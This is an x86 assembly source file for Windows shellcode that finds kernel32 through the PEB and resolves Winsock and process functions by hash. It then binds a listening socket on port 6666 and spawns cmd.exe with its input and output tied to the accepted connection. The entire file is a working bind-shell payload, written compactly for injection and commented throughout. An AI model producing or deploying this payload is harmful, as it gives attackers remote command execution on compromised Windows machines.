.386
.model flat, stdcall
option casemap :none			; case sensitive

.data

assume fs:nothing
.code
main:

;start of shellcode
;assume: eax points here

;function hashes (executable as nop-equivalent)


	push	090644D43H
	push	041203062H
	push	0D3C98159H
	lea		eax, [esp]
	
	
;start of proper code
	cdq							;set edx = 0  (eax small)
	xchg	eax, esi			;esi = addr of first function hash
	lea		edi, [esi - 018H]	;edi = addr to start writing function addr with overlapping
	
;find base addr of kernel32.dll
	mov		ebx, fs:[edx + 030H];ebx = addr of PEB
	mov		ecx, [ebx + 0CH]	;ecx = ptr to loader data
	mov		ecx, [ecx + 01CH]	;ecx = first entry in initialization order list
	mov		ecx, [ecx]
	mov		ecx, [ecx]			;ecx = third entry in list (kernel32.dll)
	mov		ebp, [ecx + 08H]	;ebp = base addr of kernel32.dll
	
;make some stack space
	mov		dh, 03H				;sizeof(WSADATA) is 0x190
	sub		esp, edx
	
;push a ptr to "ws2_32" onto stack
	mov		dx, 03233H			;rest of edx is null
	push	edx
	push	05F327377H
	push	esp
	
find_lib_functions:
	lodsb						;load next hash into al and increment esi
	cmp		al, 0D3H			;hash of WSAStartup, the trigger to LoadLibraryA("ws2_32")
	jne		find_functions
	xchg	eax, ebp			;save current hash
	call	DWORD PTR [edi - 0CH]			;LoadLibraryA("ws2_32")
	xchg	eax, ebp			;restore current hash, and update ebp with base addr of ws2_32.dll
	push	edi					;save location of addr of first winsock function
	
find_functions:
	pushad						;preserve regs
	mov		eax, [ebp + 03CH]	;eax = start of PE header
	mov		ecx, [ebp + eax + 078H];ecx = relative offset of export table
	add		ecx, ebp			;absolute addr of export table
	mov		ebx, [ecx + 020H]	;ebx = relative addr of name table
	add		ebx, ebp			;ebx = absolute addr of name table
	xor		edi, edi			;edi will count through the functions
	dec		edi
	
next_function_loop:
	inc		edi					;increment function counter
	mov		esi, [ebx + edi * 4];esi = relative offset of current function name
	add		esi, ebp			;esi = absolute addr of current function name
	cdq							;dl will hold hash (we know eax is small)
	
hash_loop:
	lodsb						;load next char into al and increment esi
	xor		al, 071H			;
	sub		dl, al
	cmp		al, 071H
	jne		hash_loop
	cmp		dl, [esp + 01CH]	;compare to the requested hash (saved on stack from pushad)
	jnz		next_function_loop	;
	
;we now have the right function
	mov		ebx, [ecx + 024H]	;ebx = relative offset of ordinal table
	add		ebx, ebp			;ebx = absolute addr of ordinal table
	mov		di, [ebx + edi * 2]	;di = ordinal number of matched function
	mov		ebx, [ecx + 01CH]	;ebx = relative offset of addr table
	add		ebx, ebp			;ebx = absolute addr of addr table
	add		ebp, [ebx + edi * 4];ebp = absolute addr of the matched function
	xchg	eax, ebp			;move func addr into eax
	pop		edi					;edi is the last onto stack in pushad
	stosd						;write func addr to [edi] and increment edi
	push	edi
	popad						;restore regs
	cmp		esi, edi			;loop until we reach end of last hash
	jne		find_lib_functions
	
;we now have all the functions
	pop		esi					;first winsock func addr
	
;initialize winsock
	push	esp					;use stack for WSADATA
	push	02H					;wVersionRequested
	lodsd						;
	call	eax					;WSAStartup
	
;null-terminate "cmd"
	mov		byte ptr [esi + 013H], al;eax = 0 if WSASStartup() worked
	
;clear some stack to use as NULL parameters
	lea		ecx, [eax + 030H]	;sizeof(STARTUPINFO) = 044H
	mov		edi, esp
	rep		stosd

;create socket
	inc		eax					;eax = 1
	push	eax					;type = 1 (SOCK_STREAM)
	inc		eax					;eax = 2
	push	eax					;af = 2 (AF_INET)
	lodsd
	call	eax					;WSASocketA
	xchg	ebp, eax			;save SOCKET descriptor in ebp (safe from being changed by remaining API calls)

;push bind parameters
	mov		eax, 0A1AFF02H		;0x1a0a = port 6666, 0x02 = AF_INET
	xor		ah, ah				;eax = 0x0A1A0002
	push	eax					;we use 0x0a1a0002 as both the name (struct sockeaddr) and namelen (which only neeed to be large enough)
	push	esp					;ptr to our sockaddr struct
	
;call bind(), listen() and accept() in turn
call_loop:
	push	ebp					;save SOCKET descriptor
	lodsd						;
	call	eax
	test	eax, eax			;bind() and listen() return 0, accept() returns a SOCKET descriptor
	jz		call_loop
	
;initialize a STARTUPINFO structure at esp
	inc 	byte ptr [esp + 02DH];set STARTF_USESTDHANDLES to true
	sub		edi, 06CH			;point edi at hStdInput in STARTUPINFO
	stosd						;use SOCKET descriptor returned by accept(still in eax) as the stdin handle same for stdout
	stosd						;same for stdout
	stosd						;same for stderr(optional)
	
;create process
	pop		eax					;eax = 0 (STARTUPINFO now at esp + 4)
	push	esp					;use stack as PROCESSINFORMATION structure (STARTUPINFO now back to esp)
	push	esp					;STARTUPINFO structure
	push	eax
	push	eax
	push	eax
	push	esp
	push	eax
	push	eax
	push	esi
	push	eax
	call	DWORD PTR [esi - 01CH]		;CreateProcessA
	
;call ExitProcess()
	call	DWORD PTR [esi - 018H]		;ExitProcess
	
end main